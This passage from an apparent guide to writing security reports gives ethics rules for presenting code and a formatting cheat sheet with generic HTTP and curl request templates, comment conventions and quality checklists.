- Don't modify code to exaggerate vulnerability
- Don't omit context that changes meaning
- Don't misrepresent code functionality
- Don't fabricate code examples
- Don't misattribute code

**Handling Sensitive Code**:

- Redact credentials and tokens
- Remove personal information
- Protect sensitive data
- Consider security implications
- Follow responsible disclosure

### Community Responsibility

**Positive Impact**:

1. **Knowledge sharing**: Share code techniques
2. **Mentoring**: Help others improve code presentation
3. **Standards promotion**: Advocate for quality
4. **Quality improvement**: Push for better code
5. **Ethical leadership**: Demonstrate integrity

## Cheat Sheet

### Code Formatting Quick Reference

**Markdown Code Blocks**:

```markdown
# Inline code
`code`

# Code block
```
code
```

# Language-specific
```python
code
```
```

**Language Identifiers**:

```
Python: python, py
JavaScript: javascript, js
Bash/Shell: bash, sh
HTTP: http
JSON: json
YAML: yaml
SQL: sql
HTML: html
```

**Code Block Best Practices**:

```
✓ Language specified
✓ Proper indentation
✓ Meaningful comments
✓ Context labels
✓ Error handling
✓ Documentation
✓ Consistent style
✓ Readable format

✗ No syntax highlighting
✗ Inconsistent indentation
✗ Missing comments
✗ No context
✗ Incomplete code
✗ Poor formatting
✗ Hardcoded values
✗ No documentation
```

**Request/Response Format**:

```http
# Request
METHOD /path HTTP/1.1
Host: domain.com
Header: value

Body

# Response
HTTP/1.1 STATUS OK
Header: value

Body
```

**curl Command Format**:

```bash
# Basic
curl 'https://target.com/endpoint'

# With options
curl -X METHOD 'https://target.com/endpoint' \
  -H 'Header: value' \
  -d 'body'

# Verbose
curl -v 'https://target.com/endpoint' 2>&1 | tee output.txt
```

**Code Comment Guidelines**:

```
Purpose: What the code does
Security: Security implications
Context: Why this approach
Warning: Potential issues
Note: Important details
See: Reference links
```

**Quality Checklist**:

```
Pre-Submission:
□ Language specified
□ Proper indentation
□ Meaningful comments
□ Context labels added
□ Error handling included
□ Documentation complete
□ Consistent style
□ Readable format

Post-Submission:
□ Code renders correctly
□ Syntax highlighting works
□ Comments clear
□ Context appropriate
□ Reproduction easy
□ Professional appearance
```

**Common Fixes**:

```
Missing Syntax Highlighting:
- Add language identifier
- Verify markdown renderer
- Check for typos

Inconsistent Formatting:
- Use formatter tool
- Apply style guide
- Manual adjustment

Missing Comments:
- Add purpose comments
- Include security notes
- Reference documentation

Poor Readability:
- Simplify complex code
- Add whitespace
- Use meaningful names
```

**Code Presentation Hierarchy**:

```
Level 1: Simple Example (5 lines)
- Basic vulnerability demonstration
- Single function or command
- Immediate understanding

Level 2: Complete Example (20 lines)
- Full function or script
- Error handling
- Documentation

Level 3: Exploit Script (50+ lines)
- Complete exploitation
- Multiple functions
- Comprehensive documentation

Level 4: Reference Material (100+ lines)
- Complete program
- Full analysis
- Appendix material
```

**Integration Checklist**:

```
□ Code referenced in text
□ Context provided
□ Key sections highlighted
□ Impact connected
□ Fix linked
□ Cross-references complete
□ Narrative flow maintained
□ Professional appearance
```
